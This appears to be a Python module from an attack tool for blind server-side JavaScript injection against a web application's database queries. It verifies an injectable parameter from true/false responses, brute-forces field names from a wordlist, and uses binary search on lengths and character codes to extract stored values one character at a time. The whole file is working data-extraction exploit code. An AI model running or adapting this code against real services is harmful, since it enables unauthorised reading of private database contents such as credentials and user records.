from utils import *



def SSJI_verify_extraction_point(success_payloads, attack_target):
    print("Testing for SSJI extraction point...")
    extraction_point = None
    for _, extraction_payload in success_payloads:           
        if "§inject§" not in str(extraction_payload):
            continue
        
        print(f"Testing extraction payload: {extraction_payload}")
        if send_extraction_request(attack_target, extraction_payload, "true"):                 
            if not send_extraction_request(attack_target, extraction_payload, "false"):         
                extraction_point = extraction_payload
                break
    
    return extraction_point


def SSJI_brute_attribute_names(attack_target, extraction_point):
    print(f"Brute Forcing attributes ...")
    # Brute Attributes
    with open("attributes.txt") as file:
        attributes_list = set(l.strip() for l in file.readlines())
    if not attributes_list:
        print("Attributes list attributes.txt could not be found")
        exit()
    attributes_list.add(attack_target.scan_param_name)
    found_attributes = []    
    
    for a, counter in zip(attributes_list, range(len(attributes_list)-1)):       
        extraction_payload = f'this.{a} != undefined'        
        if send_extraction_request(attack_target, extraction_point, extraction_payload):            
            attr_length = SSJI_get_extraction_parameter_length(attack_target,attack_target.scan_param_name, attack_target.baseline_response, extraction_point, a)
            if attr_length:
                found_attributes.append([a,attr_length])                
        progress_bar(counter, len(attributes_list)-1)
    progress_bar(1,1)    
    return found_attributes

def SSJI_get_extraction_parameter_length(attack_target,insertion_param_name, default_response, extraction_point, extraction_attribute_name):    
    low = 1 
    high = 1000 
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Caluclate the midpoint of the search area
        
        # test if length is bigger than mid
        extraction_payload = f'this.{extraction_attribute_name}.length > {mid}'    
        if send_extraction_request(attack_target, extraction_point, extraction_payload):
            low = mid + 1 
            continue
        
        # test if length is smaller than mid
        extraction_payload = f'this.{extraction_attribute_name}.length < {mid}'    
        if send_extraction_request(attack_target, extraction_point, extraction_payload):
            high = mid - 1
            continue
        
        # length should be found
        extraction_payload = f'this.{extraction_attribute_name}.length = {mid}'    
        if send_extraction_request(attack_target, extraction_point, extraction_payload):                          
            return mid  

def SSJI_brute_extract_data(attack_target, extraction_point, extraction_attribute_name, extraction_attribute_length):
    print(f"Brute forcing: {extraction_attribute_name} ...")
    result= ""
    for i in range(extraction_attribute_length):
        new_found = False
        low = 32 # Set low value of search area (' ')
        high = 127 # Set high value of search area ('~')
        mid = 0
        while low <= high:
            mid = (high + low) // 2 # Calculate the midpoint of the search area
            
            # test if bigger than mid
            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) > {mid}'    
            if send_extraction_request(attack_target, extraction_point, extraction_payload):
                low = mid + 1 
                continue
            
            # test if smaller than mid
            extraction_payload = f'this.{extraction_attribute_name}.charCodeAt({i}) < {mid}'   
            if send_extraction_request(attack_target, extraction_point, extraction_payload):
                high = mid - 1
                continue
            
            # found char
            result += chr(mid)              
            new_found = True
            progress_bar(i, extraction_attribute_length)
            break

        if not new_found:
            raise Exception(f"No new char could be found for: {extraction_attribute_name} at index {i} (max length: {extraction_attribute_length})")                                 
    progress_bar(len(result), extraction_attribute_length)    
    return result